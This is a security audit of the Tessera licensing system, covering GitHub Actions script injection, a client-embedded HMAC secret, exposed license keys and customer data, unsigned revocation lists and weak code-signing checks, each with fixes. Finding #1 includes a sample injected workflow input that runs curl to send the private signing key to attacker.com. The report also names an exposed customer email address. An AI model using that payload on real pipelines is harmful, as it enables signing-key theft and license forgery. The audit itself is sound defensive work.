# Tessera Security Audit

**Date:** 2026-04-06
**Scope:** Full codebase — Swift library, Cloudflare Worker, CLI tools, GitHub Actions workflows, static site

---

## CRITICAL Findings

### 1. GitHub Actions Script Injection via Workflow Inputs
**Files:** `.github/workflows/tessera-generate-license.yml`, `.github/workflows/tessera-renew-license.yml`
**Severity:** CRITICAL

Workflow inputs (e.g. `nickname`, `customer_email`, `features`) are interpolated directly into inline Python scripts and shell commands using `${{ inputs.* }}` syntax. An attacker who can trigger `workflow_dispatch` (anyone with write access, or the Cloudflare Worker via `GITHUB_TOKEN`) can inject arbitrary code.

**Example (tessera-generate-license.yml, line ~136):**
```python
duration_days = int("${{ inputs.duration_days }}")
```
And:
```python
"nickname": "${{ inputs.nickname }}",
"customer_email": "${{ inputs.customer_email }}",
```

If `nickname` is set to `"); import os; os.system("curl attacker.com/exfil?key=$(cat $TMPKEY | base64)")  #`, the attacker can **exfiltrate the Ed25519 private signing key** from the temporary file, which would allow forging unlimited valid license keys.

**Impact:** Complete compromise of the licensing system — attacker can forge arbitrary license keys.

**Fix:** Pass all inputs via environment variables instead of direct interpolation:
```yaml
env:
  INPUT_NICKNAME: ${{ inputs.nickname }}
```
Then reference `$INPUT_NICKNAME` in scripts, which is safe from injection.

---

### 2. Shared HMAC Secret (`trialRegistrySecret`) Embedded in Client Binary
**Files:** `Sources/Tessera/Types/TesseraConfiguration.swift:52`, `Sources/Tessera/Trial/TrialManager.swift:201-206`, `Sources/Tessera/Core/ActivationManager.swift:289-294`
**Severity:** CRITICAL

The `trialRegistrySecret` is a symmetric shared secret compiled into the app binary. While the HMAC protocol prevents wire-level extraction, the secret itself lives in the binary and can be extracted via:
- Static analysis / string extraction (`strings` on the binary)
- Runtime debugging (`lldb` attach, memory dump)
- Disassembly (the base64/UTF-8 secret is a string literal)

Once extracted, an attacker can:
- **Forge valid HMAC-authenticated requests** to the trial registry, registering/resetting trials for arbitrary fingerprints
- **Forge valid HMAC-authenticated requests** to the activation server, activating/deactivating arbitrary devices
- **Forge server responses** that the client will accept as authentic (bypass revocation, fake activation status)

**Impact:** Complete bypass of server-side trial enforcement and device seat limiting.

**Fix:** The HMAC-based mutual auth model is fundamentally limited when the secret is in the client. Consider:
- Moving to asymmetric authentication (server signs responses with a private key, client verifies with embedded public key)
- Using certificate pinning + TLS for transport security instead of application-layer HMAC
- Treating the HMAC as a speed bump rather than a security boundary, and relying on server-side enforcement as the primary control

---

## HIGH Findings

### 3. License Key Exposed in GitHub Actions Logs and Step Summary
**Files:** `.github/workflows/tessera-generate-license.yml:112-124`, `.github/workflows/tessera-renew-license.yml:103-115`
**Severity:** HIGH

The generated license key is:
1. Printed to stdout via `echo "$OUTPUT"` (visible in workflow logs)
2. Written to `$GITHUB_STEP_SUMMARY` in a code block (visible in the Actions UI)
3. Written to `$GITHUB_OUTPUT` (accessible to subsequent steps)

Anyone with read access to the repository's Actions tab can see every generated license key. For public repos, this means **anyone** can harvest license keys.

**Impact:** License key theft for anyone with repo read access.

**Fix:** Mask the license key with `::add-mask::` before echoing, or avoid printing it to logs entirely. Use encrypted artifacts or direct email delivery only.

---

### 4. `licenses.json` Committed to Public Repository with Customer PII
**File:** `Site/apps/ari/licensing/licenses.json`
**Severity:** HIGH

The licenses.json file is committed to the repo and deployed to GitHub Pages. It contains:
- Customer email addresses (`blaine@wemiller.com`)
- License IDs (which are the revocation identifiers)
- Stripe customer IDs
- Customer nicknames

This file is publicly accessible at the GitHub Pages URL and in the git history.

**Impact:** PII exposure; license IDs can be used by attackers to check revocation status or target specific licenses.

**Fix:** Either encrypt the file, move it to a private store (KV, database), or strip PII before committing. At minimum, do not include customer emails and Stripe IDs in the public file.

---

### 5. Revocation List Fetched Over HTTP Without Integrity Verification
**File:** `Sources/Tessera/Core/RevocationChecker.swift:81-103`
**Severity:** HIGH

The revocation list is fetched from a URL via `URLSession` with no integrity verification. While TLS protects the transport, if the hosting server is compromised (e.g., GitHub Pages repo takeover, DNS hijack), an attacker can serve an empty revocation list, **un-revoking all revoked licenses**.

The cached revocation list in the Keychain can also be cleared by a local attacker who has Keychain access.

**Impact:** Revoked licenses can be restored by serving a tampered revocation list.

**Fix:** Sign the revocation list with the Ed25519 key (or a separate signing key) and verify the signature client-side before accepting it.

---

### 6. CORS Wildcard on All Worker Endpoints
**File:** `Tools/stripe_worker.js:43`
**Severity:** HIGH

```javascript
"Access-Control-Allow-Origin": "*",
```

All trial registry and activation endpoints accept requests from any origin. This means any website can make cross-origin requests to the trial/activation API, enabling:
- Browser-based trial reset attacks
- Cross-site activation manipulation
- Enumeration of trial/activation state from any web page

**Impact:** Any web page can interact with the trial and activation APIs.

**Fix:** Restrict `Access-Control-Allow-Origin` to your app's domain, or remove CORS headers entirely since native macOS apps don't need them (they don't use browser fetch).

---

### 7. Offline Grace Period Allows Extended Use of Revoked Licenses
**Files:** `Sources/Tessera/Core/RevocationChecker.swift:117-125`, `Sources/Tessera/Core/ActivationManager.swift:196-208`
**Severity:** HIGH

The default `offlineGracePeriodDays` is 30 days. A user can:
1. Activate a valid license while online
2. Block network access to the revocation/activation servers (firewall rule, `/etc/hosts`)
3. Continue using the app for up to 30 days even after the license is revoked

Combined with finding #5 (no signed revocation list), this is a reliable bypass.

**Impact:** Revoked licenses remain usable for up to 30 days by blocking network access.

**Fix:** This is an inherent trade-off in offline-tolerant licensing. Consider:
- Reducing the default grace period
- Making it configurable per-tier (shorter for higher tiers)
- Requiring periodic online check for first N days after activation

---

### 8. Weak Integrity Check — No Hardened Runtime Verification
**File:** `Sources/Tessera/Security/IntegrityChecker.swift:38`
**Severity:** HIGH

```swift
let validityStatus = SecCodeCheckValidity(code, SecCSFlags(rawValue: 0), nil)
```

The integrity check uses `SecCSFlags(rawValue: 0)` which performs only basic signature validation. It does not verify:
- The **Team ID** matches your developer certificate
- The **signing identity** is yours
- The app hasn't been **re-signed** with a different certificate

An attacker can modify the binary (e.g., patch the public key), re-sign it with their own developer certificate, and the integrity check will pass.

**Impact:** Binary patching attacks succeed if the attacker re-signs the modified binary.

**Fix:** Use a `SecRequirement` that checks the specific Team ID and signing authority:
```swift
var requirement: SecRequirement?
SecRequirementCreateWithString(
    "anchor apple generic and certificate leaf[subject.OU] = \"YOUR_TEAM_ID\"" as CFString,
    [], &requirement
)
SecCodeCheckValidity(code, SecCSFlags(rawValue: 0), requirement)
```

---

## Additional Observations (Medium/Low)

| # | Finding | Severity | File |
|---|---------|----------|------|
| 9 | Clock tampering detection only catches backwards jumps > 1 hour; forward jumps are undetected (user can advance clock to expire trial, reset, get new trial) | Medium | `TrialManager.swift:448-450` |
| 10 | `kSecAttrAccessibleAfterFirstUnlock` Keychain protection allows access when device is locked; consider `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` for stronger protection | Medium | `KeychainStore.swift:68,75` |
| 11 | Error details in worker responses (line 88: `err.message`) could leak internal information | Low | `stripe_worker.js:88` |
| 12 | Decoy Keychain entry uses `com.apple.preference.*` prefix which could collide with real Apple entries or be flagged by security tools | Low | `TrialManager.swift:565` |
| 13 | No rate limiting on trial/activation API endpoints — allows brute-force fingerprint enumeration | Medium | `stripe_worker.js` |
| 14 | Private key loaded with `password=None` in CLI — no passphrase protection | Low | `tessera_cli.py:41` |
| 15 | The `features` workflow input is a freeform string field that gets passed to `int()` — no validation | Low | `tessera-generate-license.yml:29` |

---

## Summary

| Severity | Count | Key Risks |
|----------|-------|-----------|
| **Critical** | 2 | Private key exfiltration via CI injection; client secret extraction breaks all server auth |
| **High** | 6 | License key exposure in logs; PII in public repo; unsigned revocation list; CORS wildcard; grace period bypass; weak integrity check |
| **Medium** | 3 | Clock tampering gaps; Keychain protection level; no API rate limiting |
| **Low** | 3 | Error information leak; namespace collision; no key passphrase |

The most urgent fix is **#1 (GitHub Actions script injection)** — it allows complete compromise of the signing key with a single workflow dispatch.
